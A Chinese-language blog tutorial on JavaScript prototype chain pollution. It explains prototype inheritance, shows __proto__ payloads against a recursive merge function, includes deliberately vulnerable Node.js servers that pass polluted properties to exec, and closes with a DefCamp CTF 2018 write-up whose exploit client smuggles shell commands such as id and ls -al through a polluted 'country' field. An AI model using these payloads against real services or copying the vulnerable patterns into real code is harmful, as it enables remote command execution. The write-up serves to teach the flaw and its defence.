---
title: JS 原型链污染
tags:
 - vulneralbility
 - javascript
 - image: /image/bike.png
date: 2019-09-09
---

# 1@ 前言

最近开始着手编程能力的提高，主要学习和复习一些前端的知识。之前看到过 p 神博客中写到的 js 的原型链污染问题，于是自己进行了一定程度的学习和尝试，写下我的总结，供各位同学们参阅。



# 2@ JS 的原型继承机制

基础知识我在此就不做过多介绍了，还有所疑惑的同学可以[戳这](<https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more>),亦或是[戳这](<https://juejin.im/entry/58dfbe0361ff4b006b166388>)。

这里只简单说下我对 js 继承方法的理解。平常我们学到的大部分面向对象的语言都有类机制，也大多都有 class 这个关键字。而 js 大多还是使用最原生的原型链继承的方法，尽管 class 关键字已经被引入。

> 新的关键字`class`从ES6开始正式被引入到JavaScript中。`class`的目的就是让定义类更简单。



实际上，class 继承机制仍旧是原型继承实现的。

我们现在拿一个其他具有类机制的语言看下，这里使用 python 做例子。

```python
class Person():
    def __init__(self,name,age):
        self.name = name
        self.age = age
        self.money = 1000

person = Person('rt95',20)
print(person.money) // 1000
print(person.name) // rt95
```

这里的继承机制很明显，person 这个对象的生成类就是 Person() 类，类中的一切方法和属性都被对象继承，亦可以被 extends 的子类继承。



反观一下 Js 中的继承例子

```javascript
function Person(name, age) {
        this.name = name;
        this.age = age;
}
Person.prototype.money = 1000;
var person = new Person("rt95", 20);
console.log(person.money);
console.log(person.name);
```





 ![1.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/1.png)



我们一般理解的是对象直接由类构造而来，而且构造函数是在类里面的一个方法。但是 Js 却恰恰相反，它的构造函数在外面，而真正的类被包含在构造函数里面，属于构造函数的一个属性 **prototype**,所以刚开始的时候用 Js 的对象和原型的时候会感觉到特别的蹩脚。

我们可以这样来理解，以上面的例子为主，我们现在有一个对象 person ，它的类就是构造函数中的 Person.prototype, 而这个类的构造函数就是 Person()，其中：

`Person.prototype 和 person.__proto__` 指向的都是普通意义上 person 对象的类。用之前的面向对象思维理解 Js 的继承机制，可能会是个好办法，如果不喜欢这种办法，就按你舒服的方法来理解。

## 2.1 constructor

这里再提一个小点，我们在其他前端开发的代码中经常会看见类似下面的代码：

```
Student.prototype.constructor = Student;  
```

类似场景大部分出现在构造函数中的原型直接使用了其他构造函数的原型生成对象，如下代码：

```javascript
function Person(name) {
    this.name = name;
}  

Person.prototype.copy = function() {  
    return this.constructor();
};  

 
function Student(name) {  
    Person.call(this, name);
}  


Student.prototype = Object.create(Person.prototype);
```

上述代码在 Student 构造函数里面直接调用了 Person 构造函数的方法，而且构造函数的原型也直接改为了用 Person 构造函数原型创建的一个对象，即当下所有以 Student 这个构造函数构造的对象会继承所有 Person() 构造函数里面的属性和方法，可是，坏就坏在所有上面了，我们来继续看看下面的这个对象生成：

 ![2.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/2.png)



本来变量 rt95 就是 Student 这个构造函数创建的，只不过它内部使用了 Person 构造函数的方法和继承了一些属性，所以于情于理我们需要将这一点更改过来，使新创建对象们都能认识到自己真正的祖宗是谁！！！

我们再来手动的更改一下这个构造函数的对象的属性，使用下面的例子做演示：

```javascript
function Foreign(shame) {
      this.shame = shame;
 }

Foreign.prototype.copy = function() {
      return this.constructor();
 };


function China(name, shame) {
      Foreign.call(this, shame);
      this.name = name;
 }


China.prototype = Object.create(Foreign.prototype);
China.prototype.constructor = China;
```



 ![3.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/3.png)



所以不光是人需要，代码也需要认清自己真正的祖先，否则会造成很多的麻烦。



# 3@ Js 中的原型链污染

这里我们就拿 p 神博客中的例子来一起探讨一下原型链污染的问题

```javascript
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
```



函数描述的就是合并两个对象。

我们先使用原文给出的第一种 payload :

```javascript
var o1 = {}
var o2 = {a: 1, "__proto__": {b: 2}}
merge(o1, o2)
```



 ![4.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/4.png)



可以看到，这种方式合并对象，js 引擎是把  \__proto__ 当做了真正的对象的原型指向的属性，所以里面的值会被附在 o1 对象的属性上面，不会污染原型链。



我们再看第二个 payload :

```javascript
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
```

![5.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/5.png)

这里我们看到 b 的值已经成功被写入到了原型链中了，下面我们看看这两种不同处理的数据到底区别在哪。



## 3.1 真假 \__proto__

我们都知道，js 中每个对象都有自己的 \__proto__,也就是它的原型，包括它的原型也具有这个属性。而这条继承链的终点就是 Object.prototype , 这也很容易验证：

 ![6.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/6.png)



那么如果我们能控制继承链终点的这个对象的属性，那么所有之后代码中生成的对象都会继承，也就此形成了原型链污染。那么我们有什么办法可以来向这个终点对象写入属性呢？



我们首先尝试一下直接覆盖最终对象的 \_\_proto\_\_：

 ![7.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/7.png)

我们看到，虽然已经写进来了，但是并不是写到了终点对象的属性里面，也就是说，生成对象的原型的原型才是我们真正要操作的那个对象。那么现在我们想一下，这种办法生成的 \_\_proto\_\_ 属性永远都不可能是最终的那个对象的  \_\_proto\_\_,为什么呢？因为用这种方法构造出来的原型，其实还是调用了一次 Object 这个构造函数，那么最少也只能是二次继承终点对象。我们用这种方法覆盖 \_\_proto\_\_的方法是不成立的。



那么有什么办法，我们构造的这个 \_\_proto\_\_会被认定为最终对象的 \_\_proto__ 呢？目前没有直接修改的办法，因为我们不可能通过一次修改来改变系统保留的 \_\_proto\_\_ 属性，排除 那种直接可以操控的办法：

`xxx.__proto__.xxx = xxx`



但是我们可以构造一个普通的非系统保留的 \_\_proto\_\_ 属性，然后通过合并的方式来达到我们的目的。什么方法？上文已经提到了，就是 JSON.parse() 这个方法，因为解析这个 json 格式的字符串是从整体来看的，那么里面的 \_\_proto\_\_ 属性可以被解析为一个对象的普通属性。



 ![8.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/8.png)



通过对象颜色也可以看出来， 此时的这个 test对象，已经拥有了一个非系统保留的 \_\_proto\_\_ 属性，我们可以用下面的方法来检验：

 ![9.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/9.png)



那么我们可以通过键名合并的方式来将这个`假的` \_\_proto\_\_ 合并到 `真的` \_\_proto\_\_ 上面。调用上面的 merge() 方法实现。



## 3.2 其他的几种攻击场景

### 1、 控制了多个参数

想象一下这个场景，用户可以控制对象的 3 个以上的参数，那么我们将直接有机会来改变终点原型的属性：

 ![10.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/10.png)



或者是两个参数：

 ![11.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/11.png)



这是一种通过已实例化的对象来进行回溯原型污染，还可以是下面这种直接操作构造函数的形式：



![12](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/12.png)



当我们可操控的对象不是最终 Object 构造函数形成的时候，我们可以使用 testObj.\_\_proto\_\_.\_\_proto\_\_ 这种方法来回溯。

下面给出一个测试例子：

```javascript
var url = require('url');
var http = require('http');
var fs = require('fs');
var exec = require('child_process').exec;

http.createServer(function(req,res){
        var req_url = req.url;
        var str_url = url.parse(req_url,true).query;
        var path1 = String(str_url.pathname1);
        var path2 = String(str_url.pathname2);
        var value = String(str_url.value);
        var obj = {earth:{country:'UK'}};
        obj[path1][path2] = value;
        console.log(obj)
        var test = {};
        exec(test.vul,function(err,data,stderr){
        if(err){
                console.log(stderr);
        }
        else{
                console.log(data);
        }
})}).listen(1234);

```





客户端：

````html
<form action='http://127.0.0.1:1234' method="get">
pathname1:<input type="text" name="pathname1"> <br>
pathname2:<input type="text" name="pathname2"> <br>
value   :<input type:"text" name="value"> <br>
<input type='submit' name='submit'>
</form>
````

我们访问客户端来构造利用 payload :

```
pathname1 = __proto__
pathname2 = a
value = command
```



 ![13](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/13.png)





### 2、控制了路径赋值参数

有的 api 里面有通过传入路径来给对象属性赋值的方法，如果部分参数可控，便可以达到原型链污染的目的，沿用上面的代码例子，我们引入 pathval 这个第三方 api，通过里面的 setPathVal 方法，来触发原型链污染的漏洞：

```javascript
// 服务端
var url = require('url');
var http = require('http');
var fs = require('fs');
var exec = require('child_process').exec;
var pathval = require('pathval');
http.createServer(function(req,res){
        var req_url = req.url;
        var str_url = url.parse(req_url,true).query;
        var path1 = String(str_url.pathname1);
        var value = String(str_url.value);
        var obj = {earth:{country:'UK'}};
        pathval.setPathValue(obj,path1,value)
        var test = {};
        exec(test.vul,function(err,data,stderr){
        if(err){
                console.log(stderr);
        }
        else{
                console.log(data);
        }
})}).listen(1234);

```



 ![14](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/14.png)







### 3、对象克隆

实质上还是递归进行合并的做法，我们可以用前面分析过的方法理解。下面我们提下一般深层克隆的方法：

```javascript
<script>
    var obj = {
        name: "rt95",
        age: 20,
        monry: 1000
    };
    var obj1 = {};

    function clone(origin, target) {
        target = target || {};

        toStr = Object.prototype.toString;
        arrstr = "[object Array]";
        for (prop in origin) {
            if (origin.hasOwnProperty(prop)) {
                if (typeof(origin[prop]) === "object") {
                    if (toStr.call(prop) === arrstr) {
                        target[prop] = [];
                    } else {
                        target[prop] = {};
                    }
                    clone(origin[prop], target[prop])
                } else {
                    target[prop] = origin[prop];
                }
            }
        }
    }

    clone(obj, obj1);
</script>
```



大致流程就是：

```
1、生成克隆对象 ------>
2、判断 origin（被克隆对象）的元素是原始值还是引用值 ------>
3、原始值直接进行赋值，引用值需要分情况 ------>
4、引用值如果是数组，那么在克隆对象中创建一个空数组，然后递归上面原始值的克隆过程 ----->
5、引用值如果是对象，那么在克隆对象中创建一个空对象，然后递归上面原始值的克隆过程。
```



>原始值：
>
>存储在栈（stack）中的简单数据段，也就是说，它们的值直接存储在变量访问的位置。
>
>
>
>引用值：
>
>存储在堆（heap）中的对象，也就是说，存储在变量处的值是一个指针（point），指向存储对象的内存处。

- 原始值就是单变量形成的值，值一般是字面量，像整数，字符串等。
- 引用值就是对象，数组等结构型的值。

那么克隆引用值的时候赋给克隆对象的值将会是原对象所指的数据处，那么相当于克隆对象和被克隆对象共有这组值。所以为了实现完全独一份的克隆，我们需要深入到引用值内部元素，然后进行克隆对象新建相应引用值类型数据结构后的逐一赋值。









# 4@ 实战题目



题目来源于 DefCamp CTF 2018 ，源码可以[在这下载](https://dctf.def.camp/dctf-18-quals-81249812/chat.zip)。



```javscript
// 客户端代码
const io = require('socket.io-client')
const socket = io.connect('https://chat.dctfq18.def.camp') // 此处我们可以设为本地测试的地址

if(process.argv.length != 4) {
  console.log('name and channel missing')
   process.exit()
}
console.log('Logging as ' + process.argv[2] + ' on ' + process.argv[3])
var inputUser = {
  name: process.argv[2],
};

socket.on('message', function(msg) {
  console.log(msg.from,"[", msg.channel!==undefined?msg.channel:'Default',"]", "says:\n", msg.message);
});

socket.on('error', function (err) {
  console.log('received socket error:')
  console.log(err)
})

socket.emit('register', JSON.stringify(inputUser));
socket.emit('message', JSON.stringify({ msg: "hello" }));
socket.emit('join', process.argv[3]);//ps: you should keep your channels private
socket.emit('message', JSON.stringify({ channel: process.argv[3], msg: "hello channel" }));
socket.emit('message', JSON.stringify({ channel: "test", msg: "i own you" }));

```

从命令行接受进入参数后，然后将序列化后的数据发送到服务端，触发服务端事件。

在源码包里面我们发现了服务端引用模块文件 helper.js 中有如下执行系统命令的方法：

````
getAscii: function(message) {
        var e = require('child_process');
        return e.execSync("cowsay '" + message + "'").toString();
    }

````

在服务端代码中定位到使用此方法的位置：在 join 和 leave 事件里面都有使用：



```javascript
// 服务端代码
.......

io.on('connection', function (client) { 
    client.on('register', function(inUser) {
        try {
            newUser = helper.clone(JSON.parse(inUser))

.........

    client.on('join', function(channel) {
        try {
            clientManager.joinChannel(client, channel);
            sendMessageToClient(client,"Server", 
                "You joined channel", channel)

            var u = clientManager.getUsername(client);
            var c = clientManager.getCountry(client);

            sendMessageToChannel(channel,"Server", 
                helper.getAscii("User " + u + " living in " + c + " joined channel"))
        } catch(e) { console.log(e); client.disconnect() }
    });

    client.on('leave', function(channel) {
        try {
            client .join(channel);
            clientManager.leaveChannel(client, channel);
            sendMessageToClient(client,"Server", 
                "You left channel", channel)

            var u = clientManager.getUsername(client);
            var c = clientManager.getCountry(client);
            sendMessageToChannel(channel, "Server", 
                helper.getAscii("User " + u + " living in " + c + " left channel"))
        } catch(e) { console.log(e); client.disconnect() }
    });
server.listen(3000, function (err) {
  if (err) throw err;
  console.log('listening on port 3000');  // 这里的端口也可以改为本地测试端口
});

```



参数 u 和 c 是通过模块 clientManager 中的 getUsername 方法和 getCountry 方法得到，跟进到 clientManager.js 文件中：

```javascript
  getUsername: function (client) {
        return this.clients[client.id].u.name;
    },
  getCountry: function (client) {
        return this.clients[client.id].u.country;
    }

```

直接返回原先服务端注册生成的用户信息，我们来看看那个方法：

```javascript
clientManager.registerClient(client, newUser); // newUser 就是客户端传来的经过 clone 和 JSON.parse() 处理的数据。
```



```javascript
// clientManager.js
registerClient: function (client, user) {
        this.clients[client.id] = { 'c': client,
                                    'u': user,
                                    'ch': {}
        };
    }
```



所以上面的 getAscii 方法中的 u 就是我们客户端传入的经过处理的数据，只需让这个对象的 country 属性变得可利用即可，那么可以直接赋值吗？很可惜被黑名单过滤了：

```javascript
// helper.js
 validUser: function(inp) {
        var block = ["source","port","font","country",
                     "location","status","lastname"];
        if(typeof inp !== 'object') {
            return false;
        }
```

被检测函数的黑名单过滤了，那么就不能直接给 country 属性赋值了，但是我们可以放到其原型里面，所以下面我们就来看看另一个处理传入数据的函数，clone() : 

```javascript
<script>
    function clone(obj) {

        if (typeof obj !== 'object' || obj === null) {

            return obj;
        }

        var newObj;
        var cloneDeep = false;

    ......
            else {
                var proto = Object.getPrototypeOf(obj);
                if (proto && proto.isImmutable) {
				
                    newObj = obj;
                }
                else {
                    newObj = Object.create(proto);
                    cloneDeep = true;
                }
            }
        } else {
            newObj = [];
            cloneDeep = true;
        }

        if (cloneDeep) {
            var keys = Object.getOwnPropertyNames(obj);

            
            for (var i = 0; i < keys.length; ++i) {
                var key = keys[i];
                var descriptor = Object.getOwnPropertyDescriptor(obj, key);
                if (descriptor && (descriptor.get || descriptor.set)) {

                    
                    Object.defineProperty(newObj, key, descriptor);
                }
                else {
                    newObj[key] = this.clone(obj[key]);
                }
            }
        }

        return newObj;
    }
</script>
```



由于我们传入的参数直接是对象（JSON.parse() 之后的结果），所以直接定位代码到处理对象的分支：

```javascript
else {
            newObj = Object.create(proto);
            cloneDeep = true;
}
......
if (cloneDeep) {
            var keys = Object.getOwnPropertyNames(obj);


            for (var i = 0; i < keys.length; ++i) {
                var key = keys[i];
                var descriptor = Object.getOwnPropertyDescriptor(obj, key);
                if (descriptor && (descriptor.get || descriptor.set)) {


                    Object.defineProperty(newObj, key, descriptor);
                } else {
                    newObj[key] = this.clone(obj[key]);
                }
            }
        }

        return newObj;
```



其中这个方法 `getOwnPropertyDescriptor()`,返回指定对象上自有属性的对应描述符，由于我们通过 JSON.parse() 方法传入的对象已经具有 \_\_proto\_\_ 这个属性了，所以可以用这个方法获取到。

通过 Object.create() 函数创建对象，原型使用我们构造的对象的原型，即具有普通属性的 \_\_proto\_\_,则可以成功通过这个方法使得 newObj 拥有我们可控的 country 属性，而后面方法 `newObj[key]  = this.clone(obj[key])` 再写入一次还是这个结果。至此，属性 country 被写入到操作对象中，等待被调用数据，我们构造如下 payload ：

```javascript
const io = require('socket.io-client')
const socket = io.connect('https://chat.dctfq18.def.camp')  // 测试时换为本地地址

socket.on('error', function (err) {
  console.log('received socket error:')
  console.log(err)
})

socket.on('message', function(msg) {
  console.log(msg.from,"[", msg.channel!==undefined?msg.channel:'Default',"]", "says:\n", msg.message);
});

socket.emit('register', `{"name":"xxx", "__proto__":{"country":"xxx';id;echo 'xxx"}}`);
socket.emit('message', JSON.stringify({ msg: "hello" }));
socket.emit('register', `{"name":"xxx", "__proto__":{"country":"xxx';ls -al;echo 'xxx"}}`);
```

访问触发：

![15](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/15.png)



我们总结一下整个调用链：

```
1、客户端传入触发服务端 register 事件时的待解析的数据，包含原型的数据 ------>
2、客户端触发服务端 register 事件，传入数据被 JSON.parse() 方法解析后传入 clone 方法,由于__proto__ 是普通属性，可以将 country 的值赋给返回的对象 ------>
3、返回一个具有 country 属性的对象，值就是我们传入的值，拼接调用 getAscii 方法，执行命令 ------>
4、服务端返回执行命令的消息给客户端，攻击达成
```





# 5@ 总结



利用一定的函数特征可以检测出一部分的 api 是否具有潜在的 prototype_pollution 的风险，这里是一位国外学者分析的[结果](<https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf>)。

其实这种攻击的防御是比较容易的，合并或者给对象属性赋值之前，检查键名是否为 `__proto__` 等敏感词即可。







Reference:

`https://segmentfault.com/a/1190000008338987`

`https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html`

`https://juejin.im/entry/58dfbe0361ff4b006b16638`

`https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more`

`https://stackoverflow.com/questions/8453887/why-is-it-necessary-to-set-the-prototype-constructor`

`https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf`
